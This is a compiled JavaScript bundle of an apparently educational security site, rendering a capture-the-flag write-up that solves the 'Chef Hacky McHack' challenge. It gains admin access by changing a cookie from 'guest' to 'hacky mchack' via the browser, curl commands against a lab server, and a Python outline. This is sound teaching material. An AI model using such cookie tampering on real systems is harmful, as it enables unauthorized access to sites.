"use strict";(self.webpackChunkessentials_security=self.webpackChunkessentials_security||[]).push([[4593],{5680:(e,t,n)=>{n.d(t,{xA:()=>h,yg:()=>g});var a=n(6540);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function c(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),s=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},h=function(e){var t=s(e.components);return a.createElement(l.Provider,{value:t},e.children)},p="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},y=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,h=c(e,["components","mdxType","originalType","parentName"]),p=s(n),y=r,g=p["".concat(l,".").concat(y)]||p[y]||u[y]||o;return n?a.createElement(g,i(i({ref:t},h),{},{components:n})):a.createElement(g,i({ref:t},h))}));function g(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=y;var c={};for(var l in t)hasOwnProperty.call(t,l)&&(c[l]=t[l]);c.originalType=e,c[p]="string"==typeof e?e:r,i[1]=c;for(var s=2;s<o;s++)i[s]=n[s];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}y.displayName="MDXCreateElement"},561:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>u,frontMatter:()=>o,metadata:()=>c,toc:()=>s});var a=n(8168),r=(n(6540),n(5680));const o={},i="Chef Hacky McHack",c={unversionedId:"Demystifying the Web/Hacking the Web/Guides/Chef Hacky McHack/README",id:"Demystifying the Web/Hacking the Web/Guides/Chef Hacky McHack/README",title:"Chef Hacky McHack",description:"We'll solve this task in 3 ways: from the browser, from the CLI and using Python.",source:"@site/docs/Demystifying the Web/Hacking the Web/Guides/Chef Hacky McHack/README.md",sourceDirName:"Demystifying the Web/Hacking the Web/Guides/Chef Hacky McHack",slug:"/Demystifying the Web/Hacking the Web/Guides/Chef Hacky McHack/",permalink:"/essentials-security/Demystifying the Web/Hacking the Web/Guides/Chef Hacky McHack/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"sidebar",previous:{title:"Guides",permalink:"/essentials-security/Demystifying the Web/Hacking the Web/Guides/"},next:{title:"Data",permalink:"/essentials-security/Data/"}},l={},s=[{value:"Virgin: From the Browser",id:"virgin-from-the-browser",level:2},{value:"Chad v1: From the CLI",id:"chad-v1-from-the-cli",level:2},{value:"Chad v2: From Python",id:"chad-v2-from-python",level:2}],h={toc:s},p="wrapper";function u(e){let{components:t,...o}=e;return(0,r.yg)(p,(0,a.A)({},h,o,{components:t,mdxType:"MDXLayout"}),(0,r.yg)("h1",{id:"chef-hacky-mchack"},"Chef Hacky McHack"),(0,r.yg)("p",null,"We'll solve this task in 3 ways: from the browser, from the CLI and using Python.\nThat good we are!"),(0,r.yg)("h2",{id:"virgin-from-the-browser"},"Virgin: From the Browser"),(0,r.yg)("p",null,'We visit to the URL, open the Developer Tools and go over to the "Storage" tab.\nThere we see the server has given ass the cookie ',(0,r.yg)("inlineCode",{parentName:"p"},"u=guest"),"."),(0,r.yg)("p",null,(0,r.yg)("img",{alt:"Hacky McHack - Initial Cookie",src:n(1099).A,width:"1666",height:"323"})),(0,r.yg)("p",null,'Since the challenge is called "Hacky McHack" we set the cookie value to ',(0,r.yg)("inlineCode",{parentName:"p"},"hacky mchack"),".\nWe notice a new tab has appeared at the top of the page or by inspecting the HTML source: ",(0,r.yg)("strong",{parentName:"p"},"Manage")," (",(0,r.yg)("inlineCode",{parentName:"p"},"/manage.php"),").\nWe click on it and get the flag."),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-html"},'<ul class="nav-menu list-unstyled">\n    <li><a href="index.php" class="smoothScroll">Home</a></li>\n    <li><a href="#about" class="smoothScroll">About</a></li>\n    <li><a href="#portfolio" class="smoothScroll">Portfolio</a></li>\n    <li><a href="#journal" class="smoothScroll">Blog</a></li>\n    <li><a href="#contact" class="smoothScroll">Contact</a></li>\n        <li><a href="manage.php" class="smoothScroll">Manage</a></li>\n    </ul>\n')),(0,r.yg)("h2",{id:"chad-v1-from-the-cli"},"Chad v1: From the CLI"),(0,r.yg)("p",null,"We use our good friend ",(0,r.yg)("inlineCode",{parentName:"p"},"curl"),".\nFirst, we save the cookies from the initial page into a cookie jar."),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-console"},"root@kali:~# curl -c cookies.txt http://141.85.224.70:8010\n[...]\n\nroot@kali:~# cat cookies.txt\n# Netscape HTTP Cookie File\n# https://curl.haxx.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\nhttp://141.85.224.70:8010 FALSE / FALSE 1656864260 u guest\n")),(0,r.yg)("p",null,"Now we edit the file and replace ",(0,r.yg)("inlineCode",{parentName:"p"},"guest")," with ",(0,r.yg)("inlineCode",{parentName:"p"},"hacky mchack")," and send a ",(0,r.yg)("inlineCode",{parentName:"p"},"GET")," request to ",(0,r.yg)("inlineCode",{parentName:"p"},"/manage.php"),"."),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-console"},"root@kali:~# sed -i s/guest/hacky\\ mchack/ cookies.txt\n\nroot@kali:~# curl -b cookies.txt http://141.85.224.70:8010/manage.php\n")),(0,r.yg)("p",null,'If we didn\'t want to use the cookie jar, we could have simply looked at the headers sent by the server then sent the cookie "manually":'),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-console"},"root@kali:~# curl -v http://141.85.224.70:8010 > /dev/null  # we don't care about the output\n[...]\n< HTTP/1.1 200 OK\n< Date: Sun, 03 Jul 2022 16:10:51 GMT\n< Server: Apache/2.4.38 (Debian)\n< X-Powered-By: PHP/7.2.34\n< Set-Cookie: u=guest; expires=Sun, 03-Jul-2022 16:11:51 GMT; Max-Age=60\n\nroot@kali:~# curl -b 'u=hacky mchack' $URL/manage.php  # Notice the Set-Cookie field above\n<here we get the flag>\n")),(0,r.yg)("h2",{id:"chad-v2-from-python"},"Chad v2: From Python"),(0,r.yg)("p",null,"Simply create a ",(0,r.yg)("inlineCode",{parentName:"p"},"Session")," object, set the cookie ",(0,r.yg)("inlineCode",{parentName:"p"},"u")," to ",(0,r.yg)("inlineCode",{parentName:"p"},"hacky mchack"),", then send a ",(0,r.yg)("inlineCode",{parentName:"p"},"GET")," request to the ",(0,r.yg)("inlineCode",{parentName:"p"},"/manage.php")," endpoint."))}u.isMDXComponent=!0},1099:(e,t,n)=>{n.d(t,{A:()=>a});const a=n.p+"assets/images/hacky-mchack-cookies-ca643757ebb13120fc31e2c70be33b67.png"}}]);